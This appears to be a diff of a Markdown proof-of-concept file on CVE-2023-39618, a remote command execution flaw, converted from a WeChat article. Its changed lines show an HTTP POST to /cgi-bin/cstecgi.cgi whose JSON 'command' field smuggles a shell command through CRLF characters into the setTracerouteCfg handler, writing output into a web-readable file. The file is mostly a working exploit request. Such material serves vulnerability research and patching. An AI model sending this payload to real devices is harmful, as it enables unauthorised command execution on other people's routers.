@@ -7,7 +7,7 @@ cve: "CVE-2023-39618"
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tlaqoacpzx0OUMMjd9eauQ)
 
-_**CVE-2023-39618 远程命令执行**_
+_**CVE-2023-39618 远程命令执行**_
 
 _**漏洞描述**_  
 
@@ -26,18 +26,18 @@ POC
 
 ```
 POST /cgi-bin/cstecgi.cgi HTTP/1.1
-Host: xxx.xxx.xxx
+Host: xxx.xxx.xxx
 Content-Length: 86
 Accept: application/json, text/javascript, */*; q=0.01
 X-Requested-With: XMLHttpRequest
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-Origin: http://xxx.xxx.xxx
-Referer: http://xxx.xxx.xxx/login.html
+Origin: http://xxx.xxx.xxx
+Referer: http://xxx.xxx.xxx/login.html
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
-{"command":"\r\n pwd > /web/gxh_hrp.txt \r\n","num":"2","topicurl":"setTracerouteCfg"}
+{"command":"\r\n pwd > /web/gxh_hrp.txt \r\n","num":"2","topicurl":"setTracerouteCfg"}
 
 ```
 
@@ -90,8 +90,8 @@ Accept: application/json, text/javascript, */*; q=0.01
 X-Requested-With: XMLHttpRequest
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-Origin: http://xxx.xxx.xxx
-Referer: http://xxx.xxx.xxx/login.html
+Origin: http://xxx.xxx.xxx
+Referer: http://xxx.xxx.xxx/login.html
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
